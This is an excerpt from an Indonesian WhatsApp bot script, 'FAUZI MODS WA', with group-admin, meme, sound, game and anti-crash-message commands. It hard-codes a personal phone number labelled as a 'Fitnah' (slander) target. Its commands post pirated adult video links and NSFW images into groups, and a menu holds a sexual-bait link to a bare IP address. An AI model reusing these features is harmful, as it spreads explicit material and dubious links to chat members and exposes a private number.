...
//=================================================//
banChats = true // Self and Public ( FAUZI MODS WA )
bugc = true // Antibug Gc ( FAUZI MODS WA & FAUZIMODS )
antitrol = true // Antifake Trolli ( FAUZI MODS WA )
offline = false // Offline and Online ( FAUZI )
const exif = new Exif()
multi = true // Multi Prefix ( FAUZI MODS WA )
antitags = true // Antitag ( FAUZI MODS WA )
readG = true // Auto Read Group ( FAUZI MODS WA )
readP = false // Auto Read Private ( FAUZI MODS WA )
winawal = 1 // Win Tictactoe ( FAUZI MODS WA )
loseawal = 1 // Lose Tictactoe ( FAUZI MODS WA )
memberwin = 1 // Win ( FAUZI MODS WA )
memberlose = 1 // Lose ( FAUZI MODS WA )
pref = '?' // Prefix ( FAUZI MODS WA )
fake1 = '©[XM]-[XHIRO MHONSHINE] ✌️'
targetpc = '6285791677204' // Fitnah Target ( FAUZI )
owner = '6285791677204' // Numbers Owner ( FAUZI MODS WA )
ownerNumbers = ["6285791677204@s.whatsapp.net","6285791677204@s.whatsapp.net","6285791677204@s.whatsapp.net"]
linkcom = ".com" // Anti Link ( FAUZI MODS WA )
linkid = ".id" // Anti Link ( FAUZI MODS WA )
linkxyz = ".xyz" // Anti Link ( FAUZI MODS WA )
linkly = ".ly" // Anti Link ( FAUZI MODS WA )
linkhttp = "http" // Anti Link ( FAUZI MODS WA )
linkwa = "://chat.whatsapp.com" // Anti Link Group Whatsapp ( FAUZI MODS WA )
deflt = "..........c.....com" // Default Link ( FAUZI MODS WA )
linknye = `${deflt}` // Anti Link ( FAUZI MODS WA )
fake = 'FAUZI MODS WA' // Fake Text Reply / Name Bot ( FAUZI MODS WA )
a = '```' // Font Whatsapp ( FAUZI MODS WA )
bailver = '3.5.3' // Versi Baileys ( FAUZI MODS WA )
botver = '1.0.0' // Versi Bot ( FAUZI MODS WA )
numbernye = '0' // Whatsapp Numbers ( FAUZI )
waktu = '-' // Waktu Fiturs Online / Offline ( FAUZI )
alasan = '-' // Alasan Fiturs Online / Offline ( FAUZI )
ownerNumber = [`${owner}@s.whatsapp.net`] // Numbers Owner ( FAUZI )
const X = "❌" // Tictactoe ( FAUZI MODS WA & Lolhuman )
const O = "⭕️" // Tictactoe ( FAUZI MODS WA & Lolhuman )
const tunjuk = "👈" // Tictactoe ( FAUZI MODS WA & Lolhuman )
...
module.exports = FAUZI = async (FAUZI, kal) => {
	try {
...
longkapnye = "\n".repeat(420)
tekuss = `© FAUZI MODS WA 2021${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by HW MODS_\n*Jangan maen bug tod*`
FAUZI.groupRemove(kal.key.remoteJid, [nums]).catch((e) => { freply(`*ERR:* ${e}`) })
FAUZI.sendMessage(kal.key.remoteJid, 'WAH BUG NIH', MessageType.text)
FAUZI.sendMessage(kal.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
//=================================================//
                global.blocked
                m = simple.smsg(FAUZI, kal)
...
//=================================================//
    ...
    const latensi = speed() - timestamp
		...
		const botNumber = FAUZI.user.jid
		const botNumberss = FAUZI.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? kal.participant : kal.key.remoteJid
		const senderNumber = sender.split("@")[0]
	  const isBan = banUser.includes(sender)
    const isOwner = ownerNumbers.includes(sender)
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = FAUZI.user.phone
		const totalchat = await FAUZI.chats.all()
		const totalgroup = await FAUZI.chats.array.filter(v => v.jid.endsWith('g.us'))
    const totalkontak = await FAUZI.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		...
		const groupMetadata = isGroup ? await FAUZI.groupMetadata(from) : ''
    ...
    const conts = kal.key.fromMe ? FAUZI.user.jid : FAUZI.contacts[sender] || { notify: jid.replace(/@.+/, '') }
    const pushname = kal.key.fromMe ? FAUZI.user.name : conts.notify || conts.vname ||  conts.name || '-'
...
//=================================================//        
        const fakethumb = (teks, yes) => {
            FAUZI.sendMessage(from, teks, image, {thumbnail:Mfake,quoted:ikal,caption:yes})
        }
//=================================================//        
const fekekal = (teks, yes) => {        	
FAUZI.sendMessage(from,teks,image,{mimetype: Mimetype.fekekal,quoted : ikal, thumbnail: fs.readFileSync('./stik/deden.jpeg')})            
        }         
        ...
        const sendStickerFromUrl = async(to, url) => {
                ...
                download(url, './database/sampah' + names + '.png', async function () {
                    ...
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        ...
                        FAUZI.sendMessage(to, media, MessageType.sticker,{quoted:ikal})
...
// Fake Link ( FAUZI MODS WA )
const flink = {
"title": fake,
"body": `Subscribe FAUZI MODS WA`,
"previewType": "PHOTO",
...
//=================================================//
// Dari docs baileys ( FAUZI MODS WA )
...
FAUZI.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
//=================================================//
// Nge Eval Terus Gw Sempurnain ( FAUZI MODS WA & Ra  )
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await FAUZI.prepareMessage(from, kma, image)
...
FAUZI.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//
// Pahamin dari function sendbutimage terus ini cuman gw bedain type ( FAUZI  )
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await FAUZI.prepareMessage(from, kma, video)
const buttonMessages = {
...
kma = gam1
mhan = await FAUZI.prepareMessage(from, kma, location)
const buttonMessages = {
...
await FAUZI.modifyChat(m.chat, 'delete', {
...
//=================================================//
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                ...
                download(url, filename, async function () {
                    ...
                    FAUZI.sendMessage(to, media, type, { quoted: ikal, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
...
const assalamualaikum = fs.readFileSync('media/assalamualaikum.mp3')
                    FAUZI.sendMessage(from, assalamualaikum, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Bang')){
if (isBan) return reply(mess.ban)
const ahcok = fs.readFileSync('media/ahcok.mp3')
                    FAUZI.sendMessage(from, ahcok, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Bot')){
if (isBan) return reply(mess.ban)
const ikehcok = fs.readFileSync('media/ikehcok.mp3')
                    FAUZI.sendMessage(from, ikehcok, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
if (budy.startsWith('Hore')){
if (isBan) return reply(mess.ban)
const keren = fs.readFileSync('media/keren.mp3')
                    FAUZI.sendMessage(from, keren, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
...
const apa = fs.readFileSync('media/apa.mp3')
                    FAUZI.sendMessage(from, apa, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Apaan')){
                    if (isBan) return reply(mess.ban)
const apaan = fs.readFileSync('media/apaan.mp3')
                    FAUZI.sendMessage(from, apaan, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }                   
                    if (budy.startsWith('Hantam')){
                    if (isBan) return reply(mess.ban)
const hantam = fs.readFileSync('media/hantam.mp3')
                    FAUZI.sendMessage(from, hantam, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Hapus')){
                    if (isBan) return reply(mess.ban)
const hapus = fs.readFileSync('media/hapus.mp3')
                    FAUZI.sendMessage(from, hapus, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Asw')){
                    if (isBan) return reply(mess.ban)
const asw = fs.readFileSync('media/asw.mp3')
                    FAUZI.sendMessage(from, asw, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Kasian')){
                    if (isBan) return reply(mess.ban)
const kasian = fs.readFileSync('media/kasian.mp3')
                    FAUZI.sendMessage(from, kasian, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
...
const kesel = fs.readFileSync('media/kesel.mp3')
                    FAUZI.sendMessage(from, kesel, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Ketawa')){
                    if (isBan) return reply(mess.ban)
const ketawa = fs.readFileSync('media/ketawa.mp3')
                    FAUZI.sendMessage(from, ketawa, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Loli')){
                    if (isBan) return reply(mess.ban)
const loli = fs.readFileSync('media/loli.mp3')
                    FAUZI.sendMessage(from, loli, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Mastah')){
                    if (isBan) return reply(mess.ban)
const mastah = fs.readFileSync('media/mastah.mp3')
                    FAUZI.sendMessage(from, mastah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Ngeselin')){
                    if (isBan) return reply(mess.ban)
const ngeselin = fs.readFileSync('media/ngeselin.mp3')
                    FAUZI.sendMessage(from, ngeselin, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Nob')){
                    if (isBan) return reply(mess.ban)
const nob = fs.readFileSync('media/nob.mp3')
                    FAUZI.sendMessage(from, nob, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Awkwk')){
                    if (isBan) return reply(mess.ban)
const awkwk = fs.readFileSync('media/awkwk.mp3')
                    FAUZI.sendMessage(from, awkwk, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Nub')){
                    if (isBan) return reply(mess.ban)
const nub = fs.readFileSync('media/nub.mp3')
                    FAUZI.sendMessage(from, nub, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }
                    if (budy.startsWith('Sedih')){
                    if (isBan) return reply(mess.ban)
const sedih = fs.readFileSync('media/sedih.mp3')
                    FAUZI.sendMessage(from, sedih, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
                    }			
//=================================================//
//=================================================//                    
//FUNCTION
...
//=================================================//
// Auto Read Group ( FAUZI MODS WA )
var chats = await FAUZI.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await FAUZI.chatRead(jid)
})
// Auto Read Private ( FAUZI MODS WA )
var chatss = await FAUZI.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
...
const checkWin = (sender) => {
            ...
            for (let wn of _win) {
                if (wn.jid === sender) {
                    ...
                    if (_win <= 0) return FAUZI.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${_win}`, text, { quoted: ikal })
                    return `${_win}`
                    found = true
                }
            }
        ...
        const checkLose = (sender) => {
            ...
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    ...
                    if (_lose <= 0) return FAUZI.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${_lose}`, text, { quoted: ikal })
                    return `${_lose}`
                    found = true
                }
            }
        ...
        return FAUZI.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
        ...
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            ...
            if (win) {
                ...
                if (win == mode) {
                    ...
                    return FAUZI.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
	...
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		...
		nantang = O
                ...
                return FAUZI.sendMessage(from, tesk, text, {quoted:ikal, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
...
//=================================================//               
          ...
          FAUZI.updatePresence(i.jid, Presence.recording)
                   }
             }        
//=================================================//             
...
res = await FAUZI.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AgwXK5LEHA0QDMpRqeJi6_JQyUfWzuGxtuFSMoGqocJp.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "apBqxP2pqswSXteE8SWsAfSBFqwqZRTwaC5lxXMCZUw=",
						"fileLength": "25861",
						"height": 1000,
						"width": 1000,
						"mediaKey": "rzL7ASPOcfNSpCuDCdkX0xsvN7HFUN+l3SNdOKs6Kio=",
						"fileEncSha256": "IMcBWrw/I0qgiWXphtbTZg8nV053dLIb7yx8V2gfZrM=",
						"directPath": "/v/t62.7118-24/35261848_141290171742946_2063223044489842845_n.enc?ccb=11-4&oh=01_AVyjhOZY9tyQswGv-wffiFCnzutJ7WApjwdJd5b_H6douw&oe=6269AEDE",
						"mediaKeyTimestamp": "1648641734",
						"jpegThumbnail": ""
					 },
						"contentText": `❏FAUZI MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
...
break
                   ...
                   FAUZI.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so cantik`, quoted: ikal})
                   break                                      
                   case 'KEREN':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   FAUZI.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so keren`, quoted: ikal})
                   break
                   case 'GANTENG':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   FAUZI.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so ganteng`, quoted: ikal})
                   break
}
//=================================================//
//switch Botton
...
const musik1 = fs.readFileSync('media/vn/sound1.mp3')
                    FAUZI.sendMessage(from, musik1, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik2':
if (isBan) return reply(mess.ban)
const musik2 = fs.readFileSync('media/vn/sound2.mp3')
                    FAUZI.sendMessage(from, musik2, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik3':
if (isBan) return reply(mess.ban)
const musik3 = fs.readFileSync('media/vn/sound4.mp3')
                    FAUZI.sendMessage(from, musik3, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik4':
if (isBan) return reply(mess.ban)
const musik4 = fs.readFileSync('media/vn/sound4.mp3')
                    FAUZI.sendMessage(from, musik4, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik5':
if (isBan) return reply(mess.ban)
const musik5 = fs.readFileSync('media/vn/sound5.mp3')
                    FAUZI.sendMessage(from, musik5, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik6':
if (isBan) return reply(mess.ban)
const musik6 = fs.readFileSync('media/vn/sound6.mp3')
                    FAUZI.sendMessage(from, musik6, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik7':
if (isBan) return reply(mess.ban)
const musik7 = fs.readFileSync('media/vn/sound7.mp3')
                    FAUZI.sendMessage(from, musik7, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik8':
if (isBan) return reply(mess.ban)
const musik8 = fs.readFileSync('media/vn/sound8.mp3')
                    FAUZI.sendMessage(from, musik8, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik9':
if (isBan) return reply(mess.ban)
const musik9 = fs.readFileSync('media/vn/sound9.mp3')
                    FAUZI.sendMessage(from, musik9, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik10':
if (isBan) return reply(mess.ban)
const musik10 = fs.readFileSync('media/vn/sound10.mp3')
                    FAUZI.sendMessage(from, musik10, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik11':
if (isBan) return reply(mess.ban)
const musik11 = fs.readFileSync('media/vn/sound11.mp3')
                    FAUZI.sendMessage(from, musik11, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik12':
if (isBan) return reply(mess.ban)
const musik12 = fs.readFileSync('media/vn/sound12.mp3')
                    FAUZI.sendMessage(from, musik12, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik13':
if (isBan) return reply(mess.ban)
const musik13 = fs.readFileSync('media/vn/sound13.mp3')
                    FAUZI.sendMessage(from, musik13, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik14':
if (isBan) return reply(mess.ban)
const musik14 = fs.readFileSync('media/vn/sound14.mp3')
                    FAUZI.sendMessage(from, musik14, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik15':
if (isBan) return reply(mess.ban)
const musik15 = fs.readFileSync('media/vn/sound15.mp3')
                    FAUZI.sendMessage(from, musik15, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik16':
if (isBan) return reply(mess.ban)
const musik16 = fs.readFileSync('media/vn/sound16.mp3')
                    FAUZI.sendMessage(from, musik16, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik17':
if (isBan) return reply(mess.ban)
const musik17 = fs.readFileSync('media/vn/sound17.mp3')
                    FAUZI.sendMessage(from, musik17, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik18':
if (isBan) return reply(mess.ban)
const musik18 = fs.readFileSync('media/vn/sound18.mp3')
                    FAUZI.sendMessage(from, musik18, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik19':
if (isBan) return reply(mess.ban)
const musik19 = fs.readFileSync('media/vn/sound19.mp3')
                    FAUZI.sendMessage(from, musik19, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik20':
if (isBan) return reply(mess.ban)
const musik20 = fs.readFileSync('media/vn/sound20.mp3')
                    FAUZI.sendMessage(from, musik20, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik21':
if (isBan) return reply(mess.ban)
const musik21 = fs.readFileSync('media/vn/sound21.mp3')
                    FAUZI.sendMessage(from, musik21, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik22':
if (isBan) return reply(mess.ban)
const musik22 = fs.readFileSync('media/vn/sound22.mp3')
                    FAUZI.sendMessage(from, musik22, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik23':
if (isBan) return reply(mess.ban)
const musik23 = fs.readFileSync('media/vn/sound23.mp3')
                    FAUZI.sendMessage(from, musik23, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik24':
if (isBan) return reply(mess.ban)
const musik24 = fs.readFileSync('media/vn/sound24.mp3')
                    FAUZI.sendMessage(from, musik24, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik25':
if (isBan) return reply(mess.ban)
const musik25 = fs.readFileSync('media/vn/sound25.mp3')
                    FAUZI.sendMessage(from, musik25, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik26':
if (isBan) return reply(mess.ban)
const musik26 = fs.readFileSync('media/vn/sound26.mp3')
                    FAUZI.sendMessage(from, musik26, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik27':
if (isBan) return reply(mess.ban)
const musik27 = fs.readFileSync('media/vn/sound27.mp3')
                    FAUZI.sendMessage(from, musik27, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
case 'musik28':
if (isBan) return reply(mess.ban)
const musik28 = fs.readFileSync('media/vn/sound28.mp3')
                    FAUZI.sendMessage(from, musik28, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: kal})
break
// Nomor owner
case 'owner':
case 'admin':
...
HELLO !!! - AWAS SANGE -
┏━━⊱
┣❏🔥➥ NO VPN* : http://149.3.170.155/watch/48547967.html
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏FAUZI MODS WA❏",
						"buttons": [
...
FAUZI.sendMessage(from, teks, text, {contextInfo:{mentionedJid:[mentioned]}})
FAUZI.groupMakeAdmin(from, [mentioned])
} else {
FAUZI.sendMessage(from, `@${mentioned.split('@')[0]} Sekarang Admin!`, text, {contextInfo:{mentionedJid:[mentioned]}})
FAUZI.groupMakeAdmin(from, [mentioned])
}
break
}
...
if (isBan) return reply(mess.ban)
                   ...
                   anu1 = await getBuffer(anu.link)
                   FAUZI.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: ikal})
                   break                   
                   case 'cat':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   ...
                   FAUZI.sendMessage(from, anu1, image, {caption: `nih kak`, quoted: ikal})
                   break
case 'smeme':
if (isBan) return reply(mess.ban)
pe = args.join('')
...
owgi = await  FAUZI.downloadAndSaveMediaMessage(ger)
...
break
   ...
   if (isBan) return reply(mess.ban)
            ...
            FAUZI.sendMessage(from,{url:images},image,{quoted:ikal})
            });
            break
case 'attp':
if (isBan) return reply(mess.ban)
					...
					FAUZI.sendMessage(from, atetepe, sticker, { quoted: ikal })
					break
case 'darkjokes':
if (isBan) return reply(mess.ban)
...
FAUZI.sendMessage(from, hasil, image, {quoted: ikal})
break
                   case 'memeindo':  
                   if (isBan) return reply(mess.ban)
                   ...
                   FAUZI.sendMessage(from, anu1, image, {caption: `nihh kak`, quoted: ikal})
                   break
                   case 'jokes':  
                   if (isBan) return reply(mess.ban)
                   freply(`WAIT KAK CANTIK/GANTENG`)
...
if (isBan) return reply(mess.ban)
                    ...
                    FAUZI.sendMessage(from, anu, image, {caption: `Nih Kak`, quoted: ikal})
                    break
case 'nulis2':  
if (isBan) return reply(mess.ban)
...
// nekopoi +18
                ...
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi5':
                 if (isBan) return reply(mess.ban)
                 try {
				...
				fcrew = await getBuffer(pporang)
                ini_buffer = await getbuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi6':
                 if (isBan) return reply(mess.ban)
                 try {
				...
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi7':
                 if (isBan) return reply(mess.ban)
                 try {
				...
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi8':
                 if (isBan) return reply(mess.ban)
                 try {
				...
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Hikalishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break
                 case 'nekopoi9':
                 if (isBan) return reply(mess.ban)
                 try {
				...
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                FAUZI.sendMessage(from, fcrew, MessageType.image, {quoted: ikal, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU & JANGAN LUPA GUNAKAN VPN'})
                  break                        
                  //NSFw
case 'yuri':
...
FAUZI.sendMessage(from, anu, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
FAUZI.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
FAUZI.sendMessage(from, hai, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
FAUZI.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
...
break
//=================================================//
 // Anti Delete ( FAUZI MODS WA )
 	case 'd':
					FAUZI.deleteMessage(from, { id: kal.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
case 'antidelete':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe) return
...
if (isBan) return reply(mess.ban)
			if (!isGroup) return freply(mess.only.group)
				...
				if (kal.message.extendedTextMessage != undefined){
					...
					FAUZI.groupCreate(argz[0], anu)
					fakestatus(from, ` Sukses`, fake)
                }
				break	
// Leave Group ( FAUZI MODS WA )
case 'leave':
if (isBan) return reply(mess.ban)
				if (!isOwner && !kal.key.fromMe) return
				FAUZI.updatePresence(from, Presence.composing)
				FAUZI.groupLeave(from)
						break
    case 'inspect':
    if (isBan) return reply(mess.ban)
            try {
            ...
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await FAUZI.query({ 
...
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             ...
             FAUZI.sendMessage(from,par,text,{quoted:ikal,contextInfo:{mentionedJid:jids}})
             } catch {
             freply('Link error')
             }
             break
...
case 'grouplist':
if (isBan) return reply(mess.ban)
const txs = FAUZI.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${FAUZI.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n~~\n`
FAUZI.sendMessage(m.chat, '```「 List Groups 」```\n\n' + txs, text)
break
// Search Text ( FAUZI MODS WA )
case 'searchtext':
...
cok = await FAUZI.searchMessages(`${ve}`, from, batas,1) 
...
FAUZI.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
...
break
// Group Open / Close ( FAUZI MODS WA )
case 'group':
if (isBan) return reply(mess.ban)
...
FAUZI.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
freply(`* Succes CLOSE GROUP*`)
FAUZI.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
// Set Description Group ( FAUZI MODS WA )
case 'setdesc':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
FAUZI.groupUpdateDescription(from, `${args.join(" ")}`)
FAUZI.sendMessage(from, ' Succes change description group', text, {quoted:ikal})
break
// Set Name Group ( FAUZI MODS WA )
case 'setname':
if (isBan) return reply(mess.ban)
